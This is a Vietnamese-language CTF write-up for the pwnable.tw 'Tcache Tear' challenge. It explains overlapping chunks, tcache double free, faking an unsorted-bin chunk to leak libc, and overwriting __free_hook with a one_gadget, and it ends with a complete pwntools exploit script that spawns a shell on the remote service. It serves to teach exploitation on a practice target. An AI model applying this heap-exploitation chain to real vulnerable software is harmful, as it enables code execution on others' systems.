# Tcache Tear - PWNABLE.TW 

trước khi giải chall này , chúng ta cùng nghiên cứu 1 một kĩ thuật mới là **Overlapping Chunk** trong series học heap này

## Overlapping Chunk

- như chúng ta đã biết, khi khởi tạo 1 chunk luôn tồn tại phần heap metadata và phần content. 
- Heap metadata sẽ chứa dữ liệu cho biết kích thức size của chunk này
- vậy câu hỏi đặt ra là nếu heap metadata của 1 chunk thay đổi , chuyện gì sẽ xảy ra ??

oke giờ ta sẽ bước vào ví dụ này để dễ hình dung hơn:

```c 
int main(void)

{

void * ptr, * ptr1;


Ptr=malloc(0x10);//Assign the first 0x10 chunk
Malloc (0x10); / / assign a second 0x10 chunk

*(long long *)((long long)ptr-0x8)=0x41;// Modify the size field of the first block

free(ptr);

Ptr1=malloc(0x30);// Implement extend to control the content of the second block
return 0;
}
```

**(ví dụ này mình tham khảo tài liệu mình đã nghiên cứu)**

- như ta đã thấy ở trên thì có 2 lần malloc(), lần 1 khởi tạo cho Ptr, lần 2 là tạo 1 cái chunk cùng size
```c 
0x602000:   0x0000000000000000  0x0000000000000021 <=== chunk 1

0x602010:   0x0000000000000000  0x0000000000000000

0x602020:   0x0000000000000000  0x0000000000000021 <=== chunk 2

0x602030:   0x0000000000000000  0x0000000000000000

0x602040:   0x0000000000000000  0x0000000000020fc1 <=== top chunk
```
- tiếp theo ta sẽ thay đổi dữ liệu của (ptr - 0x8) lúc này là size của ptr trong heap metadata từ 0x21 thành 0x41

```c 
0x602000:   0x0000000000000000  0x0000000000000041 &lt;=== Tamper size
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000021
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000020fc1 
```
- sau đó ta free ptr, lúc này chương trình đã tưởng size của ptr là 0x41 chứ không phải là 0x21 như ta đã khởi tạo ban đầu 
- chunk 1 và chunk 2 đã kết hợp thành chunk 1 có size là 0x40, lưu trong fast bins 0x30

```c 
Fastbins[idx=0, size=0x10] 0x00

Fastbins[idx=1, size=0x20] 0x00

Fastbins[idx=2, size=0x30]  ←  Chunk(addr=0x602010, size=0x40, flags=PREV_INUSE) 

Fastbins[idx=3, size=0x40] 0x00

Fastbins[idx=4, size=0x50] 0x00

Fastbins[idx=5, size=0x60] 0x00

Fastbins[idx=6, size=0x70] 0x00
```
- sau đó ta khởi tạo malloc(0x30) nhằm lấy chunk1 + chunk2,lúc này chúng ta có thể trực tiếp kiểm soát  content của chunk2, **và đây còn gọi là lỗi Overlapping Chunk**

```==> Nói một cách đơn giản, tác dụng của kĩ thuật này là kiểm soát content của chunk 2 bằng cách thay đổi size của chunk 1```

### Reference
- **Writeup:** https://j4guar.tistory.com/52
- **Dreamhack:** https://learn.dreamhack.io/16#55
- **CTF Wiki:** https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/chunk_extend_overlapping/


## Phân tích 

sau khi biết thêm về **Overlapping Chunk**, giờ đây ta sẽ tiếp tục giải chall này

### Ida
```c 
int menu()
{
  puts("$$$$$$$$$$$$$$$$$$$$$$$");
  puts("      Tcache tear     ");
  puts("$$$$$$$$$$$$$$$$$$$$$$$");
  puts("  1. Malloc            ");
  puts("  2. Free              ");
  puts("  3. Info              ");
  puts("  4. Exit              ");
  puts("$$$$$$$$$$$$$$$$$$$$$$$");
  return printf("Your choice :");
}

int add()
{
  unsigned __int64 v0; // rax
  int size; // [rsp+8h] [rbp-8h]

  printf("Size:");
  v0 = choice();
  size = v0;
  if ( v0 <= 0xFF )
  {
    ptr = malloc(v0);
    printf("Data:");
    read_func(ptr, (unsigned int)(size - 16));
    LODWORD(v0) = puts("Done !");
  }
  return v0;
}

ssize_t show()
{
  printf("Name :");
  return write(1, &name_addr, 0x20uLL);
}

void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  __int64 idx; // rax
  unsigned int v4; // [rsp+Ch] [rbp-4h]

  sub_400948(a1, a2, a3);
  printf("Name:");
  read_func(&name_addr, 32LL);
  v4 = 0;
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      idx = choice();
      if ( idx != 2 )
        break;
      if ( v4 <= 7 )
      {
        free(ptr);
        ++v4;
      }
    }
    if ( idx > 2 )
    {
      if ( idx == 3 )
      {
        show();
      }
      else
      {
        if ( idx == 4 )
          exit(0);
LABEL_14:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( idx != 1 )
        goto LABEL_14;
      add();
    }
  }
}
```

- như đã thấy trên ida thì ta có 4 option, 1 là tạo 1 chunk, 2 là free thằng ptr, 3 là show là content của name_addr
- **ptr = 0x602088 và name_addr = 0x602060**
- bài này ta dự đoán hướng làm là **overwrite free hook** (vì có thể free nhiều lần cũng như không có hàm tạo shell hay cat flag)
- ta cần leak được libc, mà bây giờ hàm show() chia in mỗi name_addr, nên ta nghĩ ngay làm cách nào để free được name_addr
- để có libc trong content thì cần free vào unsorted bins, mà chương trình đã giới hạn còn 0xff(255), mà ta cần trên 0x400 => **sử dụng Overlapping Chunk vừa học đề fake heap meta data**
- à ở đây ta còn có thêm lỗi **Double Free và Use After Free** để dễ dàng leak libc nữa

## Khai thác

- đầu tiên ta cần leak libc trước
- sử dụng lỗi **Double Free** để biến name_addr thành 1 chunk, sau đó sẽ thay đổi (name_addr - 0x8) thành 0x451 nhầm tạo ra 1 chunk có địa chỉ là name_addr với size là 0x440

![image](https://github.com/gookoosss/CTF/assets/128712571/a5805d59-1c6c-484f-99de-28624fa0c498)

- để hàm free(ptr) có thể free name_addr thì ta cần gán địa chỉ name_addr vào ptr
 
![image](https://github.com/gookoosss/CTF/assets/128712571/e056e192-6e42-435e-bb1c-6592e52617fa)

- lúc này ta đã tạo được 1 chunk có size là 0x440, địa chỉ của chunk là name_addr, và ta cũng đã gán name_addr vào ptr rồi nên khi ta free nó sẽ lưu vào unsorted bins và ta leak được libc 

```python 
add(0x80, b'a' * 16)
delete()
delete()
add(0x80, p64(name_addr - 0x10)) # heap metadat
add(0x80, p64(name_addr - 0x10))
payload = p64(0) + p64(0x451) # size
payload += p64(0xcafebabe) + p64(0) # content
payload += p64(0xcafebabe) + p64(0)
payload += p64(0xcafebabe) + p64(name_addr) # 0x602088(ptr) == name_addr
add(0x80, payload)
delete()
show()
```
- hmm nhưng có vẻ có bug không như mong đợi rồi

![image](https://github.com/gookoosss/CTF/assets/128712571/9df92c01-e17c-4f1d-8f71-7cea78bf185d)


- ta copy bug rồi lên web này xem: https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c
- theo như mình tham khảo wu thì **bug này nó sẽ check cái chunk đằng sau cái chunk ta định free set có được set đầy đủ INUSE hay không**

![image](https://github.com/gookoosss/CTF/assets/128712571/3bf190fd-dbc3-4da4-9531-4643e6377615)

- vậy thì giờ ta **cần tạo ra 1 fake chunk khác đằng sau name_addr với size như nào cũng được**, nhưng mà nên làm nhỏ thôi 
```python 
add(0x90, b'a' * 16)
delete()
delete()
add(0x90, p64(name_addr + 0x450 - 0x10)) #fake chunk
add(0x90, p64(name_addr + 0x450 - 0x10))
payload = p64(0) + p64(0x21) #size
payload += p64(0) + p64(0x21) 
payload += p64(0) + p64(0x21)
add(0x90, payload)
```
- à lời khuyên là mỗi lần **Double Free** ta nên khởi tạo 1 chunk có size khác nhau để tránh bug nha
- lúc này ta đã free được name_addr vào unsorted bins rồi, h ta leak libc thôi
```python 
# 0x3ebca0 
p.recvuntil(b'Name :')
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 0x3ebca0
log.info('libc leak: ' + hex(libc_leak))
log.info('libc base: ' + hex(libc.address))
```
- đã có libc rồi, để làm nhanh thì mình dùng **one_gadget luôn gán vào __free_hook**, cách làm tương tự như trên, sau đó ta free rồi lấy shell thôi 
```python 
one_gadget = libc.address + 0x4f322
#0x4f322 0x10a38c
add(0x70, b'a' * 16)
delete()
delete()
add(0x70, p64(libc.sym['__free_hook']))
add(0x70, p64(libc.sym['__free_hook']))
add(0x70, p64(one_gadget))
delete()
```
- dee và ta đã có được flag

![image](https://github.com/gookoosss/CTF/assets/128712571/65873745-a89a-4b73-9cd4-a9abca92f0ac)


## script 

```python 
#!/usr/bin/env python3

from pwn import *

exe = ELF("./tcache_tear_patched")
libc = ELF("./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so")
ld = ELF("./ld-2.27.so")

context.binary = exe
# p = process([exe.path])

# gdb.attach(p, gdbscript= '''
# b*0x400C54
# b*0x400C59
# b*0x400B54
# b*0x400B59
# b*0x400b90
# b*0x400BA9
# c
# ''')
# input()

p = remote("chall.pwnable.tw", 10207)

name_addr = 0x602060
ptr = 0x602088

def add(size, data):
    p.sendafter(b'choice :', b'1')
    p.sendafter(b'Size:', str(size))
    p.sendafter(b'Data:', data)

def delete():
    p.sendafter(b'choice :', b'2')

def show():
    p.sendafter(b'choice :', b'3')

p.sendafter(b'Name:', b'giabao')

add(0x90, b'a' * 16)
delete()
delete()
add(0x90, p64(name_addr + 0x450 - 0x10))
add(0x90, p64(name_addr + 0x450 - 0x10))
payload = p64(0) + p64(0x21)
payload += p64(0) + p64(0x21)
payload += p64(0) + p64(0x21)
add(0x90, payload)

add(0x80, b'a' * 16)
delete()
delete()
add(0x80, p64(name_addr - 0x10)) # heap metadat
add(0x80, p64(name_addr - 0x10))
payload = p64(0) + p64(0x451) # size
payload += p64(0xcafebabe) + p64(0) # content
payload += p64(0xcafebabe) + p64(0)
payload += p64(0xcafebabe) + p64(name_addr) # 0x602088(ptr) == name_addr
add(0x80, payload)
delete()
show()

# 0x3ebca0 
p.recvuntil(b'Name :')
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 0x3ebca0
log.info('libc leak: ' + hex(libc_leak))
log.info('libc base: ' + hex(libc.address))

one_gadget = libc.address + 0x4f322
#0x4f322 0x10a38c
add(0x70, b'a' * 16)
delete()
delete()
add(0x70, p64(libc.sym['__free_hook']))
add(0x70, p64(libc.sym['__free_hook']))
add(0x70, p64(one_gadget))
delete()
    
p.interactive()
```

## Flag

FLAG{tc4ch3_1s_34sy_f0r_y0u}

